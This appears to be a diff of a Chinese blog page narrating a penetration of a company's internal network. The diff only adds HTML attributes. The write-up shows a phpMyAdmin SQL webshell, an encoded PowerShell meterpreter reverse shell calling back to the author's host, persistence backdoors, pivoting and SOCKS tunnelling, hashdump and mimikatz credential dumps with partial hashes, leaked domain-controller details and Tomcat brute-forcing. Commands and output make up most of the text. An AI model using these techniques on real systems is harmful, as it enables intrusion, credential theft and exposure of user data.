@@ -96,17 +96,17 @@
 <p>扫描到它存在<code>phpMyadmin</code>，弱口令登录进入，通过常规手法SQL写入shell。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#39;&lt;?php @assert($_POST[&#34;qyxmsq56dhaye3&#34;]);?&gt;&#39;</span> <span style="color:#66d9ef">INTO</span> OUTFILE <span style="color:#e6db74">&#39;D:/WWW/***/master/&#39;</span>;
 </code></pre></div><p>通过Webshell的方式进入，肯定是要直接看权限了，但是由于是他们的测试环境，权限相对比较高。</p>
-<pre><code>D:\WWW\***\master\&gt; net user /domain
+<pre tabindex="0"><code>D:\WWW\***\master\&gt; net user /domain
 这项请求将在域 WORKGROUP 的域控制器处理。
 
 发生系统错误 1355。
 
 指定的域不存在，或无法联系。
 </code></pre><p>通过上面的结果可以看到该服务器并不是域成员</p>
-<pre><code>D:\WWW\***\master\&gt; query user
+<pre tabindex="0"><code>D:\WWW\***\master\&gt; query user
 * 没有用户
 </code></pre><p>没有管理员在线</p>
-<pre><code>
+<pre tabindex="0"><code>
 D:\WWW\***\master\&gt; netstat -ano
 
 活动连接
@@ -160,7 +160,7 @@ D:\WWW\***\master\&gt; netstat -ano
 </code></pre><p>可以发现有3389端口，我尝试了去直接连接，但是被拒绝了，绝对是防火墙做了入站限制</p>
 <p>这个尝试是有风险的，因为你不知道下一步的操作能够为自己带来怎样的走向</p>
 <p>再查看一下网卡：</p>
-<pre><code>D:\WWW\****\master\&gt; ipconfig
+<pre tabindex="0"><code>D:\WWW\****\master\&gt; ipconfig
 
 Windows IP 配置
 
@@ -233,7 +233,7 @@ Windows IP 配置
 <p><code>./ps1encode.rb -i 外网IP -p 1131 -a windows/x64/meterpreter/reverse_tcp </code></p>
 <p>这里我是进行了一个端口转发，将公司路由的1131映射到本机的1131</p>
 <p>MSF这边监听1131：</p>
-<pre><code>Jobs
+<pre tabindex="0"><code>Jobs
 ====
 
   Id  Name                    Payload                          Payload opts
@@ -242,26 +242,26 @@ Windows IP 配置
 </code></pre><blockquote>
 <p>ps1encode 项目 ：https://github.com/CroweCybersecurity/ps1encode</p>
 </blockquote>
-<pre><code>powershell -nop -win Hidden -noni -enc JAAxACAAPQAgACcAJABjACAAPQAgACcAJwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAFYAaQByAHQAdQBhAGwAQQBsAGwAbwBjACgASQBuAHQAUAB0AHIAIABsAHAAQQBkAGQAcgBlAHMAcwAsACAAdQBpAG4AdAAgAGQAdwBTAGkAegBlACwAIAB1AGkAbgB0ACAAZgBsAEEAbABsAG8AYwBhAHQAaQBvAG4AVAB5AHAAZQAsACAAdQBpAG4AdAAgAGYAbABQAHIAbwB0AGUAYwB0ACkAOwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQ
+<pre tabindex="0"><code>powershell -nop -win Hidden -noni -enc JAAxACAAPQAgACcAJABjACAAPQAgACcAJwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAFYAaQByAHQAdQBhAGwAQQBsAGwAbwBjACgASQBuAHQAUAB0AHIAIABsAHAAQQBkAGQAcgBlAHMAcwAsACAAdQBpAG4AdAAgAGQAdwBTAGkAegBlACwAIAB1AGkAbgB0ACAAZgBsAEEAbABsAG8AYwBhAHQAaQBvAG4AVAB5AHAAZQAsACAAdQBpAG4AdAAgAGYAbABQAHIAbwB0AGUAYwB0ACkAOwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQ
 ..........
 </code></pre><p>但是期望越大失望越大，目标主机提示语法错误，难道是webshell传输字符串太长有丢失？</p>
 <p>我尝试了使用cmd批处理脚本启动，vbs脚本启动，一样无果。</p>
 <p>决定不采用powershell了，采用exe</p>
-<pre><code>./ps1encode.rb -i [我的公网IP] -p 1131 -a windows/x64/meterpreter/reverse_tcp -t exe
+<pre tabindex="0"><code>./ps1encode.rb -i [我的公网IP] -p 1131 -a windows/x64/meterpreter/reverse_tcp -t exe
 </code></pre><p>执行过程中有时候会出现这类情况：</p>
-<pre><code>msf exploit(handler) &gt; 
+<pre tabindex="0"><code>msf exploit(handler) &gt; 
 [*] Sending stage (179267 bytes) to *.*.*.*
 [*] Meterpreter session 1 opened (192.168.3.13:1131 -&gt; *.*.*.*:54103) at 2017-12-27 13:54:58 +0800
 [*] *.*.*.* - Meterpreter session 9 closed.  Reason: Died
 </code></pre><p>很明显是生成的木马与操作系统不兼容；</p>
 <p>更改为：</p>
-<pre><code>./ps1encode.rb -i *.*.*.* -p 1131 -a windows/x64/meterpreter/reverse_tcp --32bitexe -t exe
+<pre tabindex="0"><code>./ps1encode.rb -i *.*.*.* -p 1131 -a windows/x64/meterpreter/reverse_tcp --32bitexe -t exe
 </code></pre><p>使用WebShell执行后：</p>
-<pre><code>msf exploit(handler) &gt; 
+<pre tabindex="0"><code>msf exploit(handler) &gt; 
 [*] Sending stage (179267 bytes) to *.*.*.*
 [*] Meterpreter session 6 opened (192.168.3.13:1131 -&gt; *.*.*.*:54085) at 2017-12-27 13:51:41 +0800
 </code></pre><h3 id="权限维持">权限维持</h3>
-<pre><code>msf exploit(handler) &gt; sessions -i 6
+<pre tabindex="0"><code>msf exploit(handler) &gt; sessions -i 6
 [*] Starting interaction with 6...
 meterpreter &gt; getsystem
 ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
@@ -282,7 +282,7 @@ meterpreter &gt; run persistence -X -i 50 -p 1132 -r [我的公网IP]
 <blockquote>
 <p>persistence 模块</p>
 </blockquote>
-<pre><code>meterpreter &gt; info post/windows/manage/persistence_exe
+<pre tabindex="0"><code>meterpreter &gt; info post/windows/manage/persistence_exe
 
        Name: Windows Manage Persistent EXE Payload Installer
      Module: post/windows/manage/persistence_exe
@@ -321,7 +321,7 @@ Module options (post/windows/manage/persistence_exe):
 </code></pre><p>优先介绍这个模块 <code>post/windows/manage/persistence_exe</code></p>
 <p>它用于创建一个反向连接的后门，使被控端主动连接控制端，传统又好用，但是会留下文件</p>
 <p>参数介绍：</p>
-<pre><code>[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
+<pre tabindex="0"><code>[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
 [!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
 Meterpreter Script for creating a persistent backdoor on a target host.
 
@@ -341,7 +341,7 @@ OPTIONS:
 </code></pre><blockquote>
 <p>metsvc</p>
 </blockquote>
-<pre><code>meterpreter &gt; run metsvc -h
+<pre tabindex="0"><code>meterpreter &gt; run metsvc -h
 
 [!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
 [!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
@@ -354,7 +354,7 @@ OPTIONS:
 
 </code></pre><p>它是一个正向的连接，不适用于复杂的内网环境</p>
 <h2 id="0x04-端口转发之portfwd详解">0x04 端口转发之portfwd详解</h2>
-<pre><code>meterpreter &gt; ifconfig
+<pre tabindex="0"><code>meterpreter &gt; ifconfig
 
 Interface  1
 ============
@@ -458,7 +458,7 @@ Hardware MAC : 00:00:00:00:00:00
 MTU          : 1280
 IPv6 Address : 2002:7b67:7168::7b67:7168
 IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
-</code></pre><pre><code>meterpreter &gt; netstat -anpt
+</code></pre><pre tabindex="0"><code>meterpreter &gt; netstat -anpt
 
 Connection list
 ===============
@@ -514,7 +514,7 @@ Connection list
     udp6   fe80::4d1c:361b:b5e7:5894:546  :::*                              0     0      1052/svchost.exe
 </code></pre><p>可以看出服务器开启了3389，假设我如果需要连接3389该怎么办呢？ -  (刚才提到了，有防火墙的限制)</p>
 <h3 id="使用portfwd">使用portfwd</h3>
-<pre><code>meterpreter &gt; portfwd -h
+<pre tabindex="0"><code>meterpreter &gt; portfwd -h
 Usage: portfwd [-h] [add | delete | list | flush] [args]
 
 
@@ -531,29 +531,29 @@ OPTIONS:
 <blockquote>
 <p>目的：将内网某台主机的3389转发到本地</p>
 </blockquote>
-<pre><code>portfwd add -L 0.0.0.0 -l 1144 -p 3389 -r 10.159.63.178
+<pre tabindex="0"><code>portfwd add -L 0.0.0.0 -l 1144 -p 3389 -r 10.159.63.178
 </code></pre><p>此时连接本机的1144就相当于连接10.159.63.178</p>
 <blockquote>
 <p>目的：将内网某台主机端口流量转发到某台外网主机 (可做端口劫持)</p>
 </blockquote>
-<pre><code>portfwd add -R -l 8080 -p 1478 -L 10.159.191.2
+<pre tabindex="0"><code>portfwd add -R -l 8080 -p 1478 -L 10.159.191.2
 </code></pre><p>此时访问10.159.63.178的1478端口就相当于访问10.159.191.2的8080端口</p>
-<pre><code>portfwd delete -i 1
+<pre tabindex="0"><code>portfwd delete -i 1
 </code></pre><p>删除条目为1的端口转发</p>
-<pre><code>portfwd list
+<pre tabindex="0"><code>portfwd list
 </code></pre><p>列出端口转发条目</p>
-<pre><code>portfwd flush
+<pre tabindex="0"><code>portfwd flush
 </code></pre><p>清空所有转发</p>
 <h3 id="端口扫描">端口扫描</h3>
 <blockquote>
 <p>添加路由表:</p>
 </blockquote>
-<pre><code>meterpreter &gt; run autoroute -s 10.159.0.0 255.255.128.0
+<pre tabindex="0"><code>meterpreter &gt; run autoroute -s 10.159.0.0 255.255.128.0
 meterpreter &gt; run autoroute -s 10.159.128.0 255.255.128.0
 meterpreter &gt; run autoroute -s 10.159.63.0 255.255.255.128
 meterpreter &gt; run autoroute -s 10.159.191.0 255.255.255.128
 </code></pre><p>当然在上线前，你就设置好自动添加路由，就不需要去手动添加了：</p>
-<pre><code>msf auxiliary(tcp) &gt; load auto_add_route
+<pre tabindex="0"><code>msf auxiliary(tcp) &gt; load auto_add_route
 msf auxiliary(tcp) &gt; 
 [*] Sending stage (179267 bytes) to ***.***.***.***
 [*] Meterpreter session 9 opened (192.168.3.14:1131 -&gt; ***.***.***.***:60372) at 2018-01-02 15:22:20 +0800
@@ -573,13 +573,13 @@ meterpreter &gt;
 <blockquote>
 <p>扫描</p>
 </blockquote>
-<pre><code>msf exploit(handler) &gt; use auxiliary/scanner/portscan/syn
+<pre tabindex="0"><code>msf exploit(handler) &gt; use auxiliary/scanner/portscan/syn
 msf auxiliary(syn) &gt; set PORTS 22-25,80-85,1433,3306,3389,445,135,139
 PORTS =&gt; 22-25,80-85,1433,3306,3389,445,135,139
 msf auxiliary(syn) &gt; set RHOSTS 10.159.191.1-254
 RHOSTS =&gt; 10.159.191.1-254
 msf auxiliary(syn) &gt; run
-</code></pre><pre><code>msf &gt; use auxiliary/scanner/portscan/tcp 
+</code></pre><pre tabindex="0"><code>msf &gt; use auxiliary/scanner/portscan/tcp 
 msf auxiliary(tcp) &gt; show options 
 
 Module options (auxiliary/scanner/portscan/tcp):
@@ -642,7 +642,7 @@ msf auxiliary(tcp) &gt; run
 <blockquote>
 <p>run hashdump</p>
 </blockquote>
-<pre><code>meterpreter &gt; run hashdump 
+<pre tabindex="0"><code>meterpreter &gt; run hashdump 
 
 [!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.
 [!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]
@@ -669,7 +669,7 @@ neuadmin:1005:aad3b435***404ee:345b3b0faf52aea5200da1cf8d1323a0:::
 </code></pre><blockquote>
 <p>run powerdump</p>
 </blockquote>
-<pre><code>meterpreter &gt; run powerdump 
+<pre tabindex="0"><code>meterpreter &gt; run powerdump 
 [*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...
 [*] Running PowerDump to extract Username and Password Hashes...
 [*] Uploaded PowerDump as 53805.ps1 to %TEMP%...
@@ -687,7 +687,7 @@ allen:1007:aad3b435b51404eeaad3b435b51404ee:53a6281e41664275dfbccd4d171e406f:::
 <p>load mimikatz
 kerberos</p>
 </blockquote>
-<pre><code>meterpreter &gt; load mimikatz 
+<pre tabindex="0"><code>meterpreter &gt; load mimikatz 
 Loading extension mimikatz...
 [!] Loaded x86 Mimikatz on an x64 architecture.
 Success.
@@ -703,7 +703,7 @@ AuthID      Package    Domain        User           Password
 </code></pre><blockquote>
 <p>run post/windows/gather/smart_hashdump</p>
 </blockquote>
-<pre><code>meterpreter &gt; run post/windows/gather/smart_hashdump
+<pre tabindex="0"><code>meterpreter &gt; run post/windows/gather/smart_hashdump
 
 [*] Running module against ZXKF3
 [*] Hashes will be saved to the database if one is connected.
@@ -728,7 +728,7 @@ AuthID      Package    Domain        User           Password
 <p>Powersploit <a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p>
 </blockquote>
 <p>第一种办法（推荐）：</p>
-<pre><code>meterpreter &gt; load powershell 
+<pre tabindex="0"><code>meterpreter &gt; load powershell 
 Loading extension powershell...Success.
 meterpreter &gt; powershell_shell
 PS &gt; whoami
@@ -747,7 +747,7 @@ finishTime    : 2017/12/28 17:19:46
 .....
 
 </code></pre><p>第二种办法：(先通过其他模块下载)</p>
-<pre><code>meterpreter &gt; run post/windows/manage/download_exec URL=https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1
+<pre tabindex="0"><code>meterpreter &gt; run post/windows/manage/download_exec URL=https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1
 
 [*] 41534 bytes downloaded to C:\Windows\TEMP\Invoke-Portscan.ps1 in 1 seconds 
 meterpreter &gt; powershell_shell 
@@ -765,9 +765,9 @@ finishTime    : 2017/12/28 17:23:45
 <p>之前的方案是使用<code>Portfwd</code>，但是效果太差了，当数据流过大，会将Meterpreter冲掉，并且每次数据回送都不完整。</p>
 <p>这次采用Socks5打洞，我利用了外网的服务器，开设一个Socks代理端口，将流量转发到目标内网</p>
 <p>外网服务器：</p>
-<pre><code>root@iZm5e***1ga7bq07Z:~# ./ew_for_linux64 -s rcsocks -l 1080 -e 888 &amp;
+<pre tabindex="0"><code>root@iZm5e***1ga7bq07Z:~# ./ew_for_linux64 -s rcsocks -l 1080 -e 888 &amp;
 </code></pre><p>内网主机：</p>
-<pre><code>ew_for_Win.exe -s rssocks -d [服务器IP] -e 888
+<pre tabindex="0"><code>ew_for_Win.exe -s rssocks -d [服务器IP] -e 888
 </code></pre><blockquote>
 <p>ew下载地址： <a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p>
 </blockquote>
@@ -777,11 +777,11 @@ finishTime    : 2017/12/28 17:23:45
 <h2 id="0x08-开始扫描">0x08 开始扫描</h2>
 <p>一开始我使用PowerSploit扫描，但是需要等待Meterpreter将数据取回，这样就占用了一个session，搜集了部分信息后，决定采用Nmap</p>
 <p>由于我的操作系统是黑苹果，需要安装proxychains-ng</p>
-<pre><code>brew install proxychains-ng
+<pre tabindex="0"><code>brew install proxychains-ng
 </code></pre><p>程序安装在：<code>/usr/local/Cellar/proxychains-ng/4.12_1/bin/proxychains4</code></p>
 <p>配置文件：<code>/usr/local/etc/proxychains.conf</code></p>
 <p>添加一条Socks5代理：</p>
-<pre><code>#Examples:
+<pre tabindex="0"><code>#Examples:
 #
 #       socks5  192.168.67.78   1080    lamer   secret
 #       http    192.168.89.3    8080    justu   hidden
@@ -804,7 +804,7 @@ socks5  ***.***.***.*** 1080
 <h3 id="轻松获得域控服务器">轻松获得域控服务器</h3>
 <p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x007.png" alt="域控"></p>
 <p>从文档中搜集信息如下：</p>
-<pre><code>密码：*****@*****! *****
+<pre tabindex="0"><code>密码：*****@*****! *****
 
 administrator密码：***** # 后面尝试了登录这个，不行
 IP地址：10.159.16.2
@@ -858,7 +858,7 @@ IP地址2：192.168.10.4
 </ul>
 <p>基本上都是50个口以上</p>
 <p>通过之前的自动搜集的路由来看：</p>
-<pre><code>[*] AutoAddRoute: Routing new subnet 10.0.0.0/255.0.0.0 through session 9
+<pre tabindex="0"><code>[*] AutoAddRoute: Routing new subnet 10.0.0.0/255.0.0.0 through session 9
 [*] AutoAddRoute: Routing new subnet 10.159.0.0/255.255.128.0 through session 9
 [*] AutoAddRoute: Routing new subnet 10.159.63.128/255.255.255.128 through session 9
 [*] AutoAddRoute: Routing new subnet 10.159.128.0/255.255.128.0 through session 9
@@ -875,7 +875,7 @@ IP地址2：192.168.10.4
 <p>搜集到用户中心的数据库配置，也就是说泄漏了所有用户的数据了，这可是一个大厂。</p>
 <p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x0015.png" alt="数据库"></p>
 <p>其次一些网段基本上都安装了<code>tomcat</code>，通过socks5代理，进行爆破，流量不走Meterpreter，因为会掉线</p>
-<pre><code>msf auxiliary(tomcat_mgr_login) &gt; show options 
+<pre tabindex="0"><code>msf auxiliary(tomcat_mgr_login) &gt; show options 
 
 Module options (auxiliary/scanner/http/tomcat_mgr_login):
 
